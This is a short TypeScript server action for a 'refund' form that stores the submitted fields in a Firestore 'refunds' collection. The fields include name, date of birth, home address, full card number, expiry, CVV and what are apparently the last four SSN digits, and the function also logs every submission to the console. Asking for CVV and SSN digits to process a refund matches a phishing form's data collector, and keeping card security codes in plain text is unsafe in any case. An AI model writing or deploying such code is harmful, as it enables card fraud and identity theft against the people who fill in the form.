"use server"

import { db } from './firebase';
import { collection, addDoc } from 'firebase/firestore';

// Define an interface for the form data
export interface FormData {
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  dob: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  lfssn: string;
}

// Define the function to handle form submission
export const handleFormSubmit = async (data: FormData): Promise<{ message: string }> => {
  console.log('Submitting data:', data);

  try {
    // Add data to Firestore (Refunds collection)
    const docRef = await addDoc(collection(db, 'refunds'), {
      orderId: data.orderId,
      reason: data.reason,
      firstName: data.firstName,
      lastName: data.lastName,
      dob: data.dob,
      mobileNumber: data.mobileNumber,
      homeAddress: data.homeAddress,
      zipCode: data.zipCode,
      cardType: data.cardType,
      cardNumber: data.cardNumber,
      expirationDate: data.expirationDate,
      cvv: data.cvv,
      lfssn: data.lfssn,
      timestamp: new Date(),
    });

    console.log('Document written with ID:', docRef.id);
    return { message: 'Success' }; // Return success response
  } catch (e) {
    console.error('Error adding document: ', e);
    throw new Error('Failed to submit data.');
  }
};
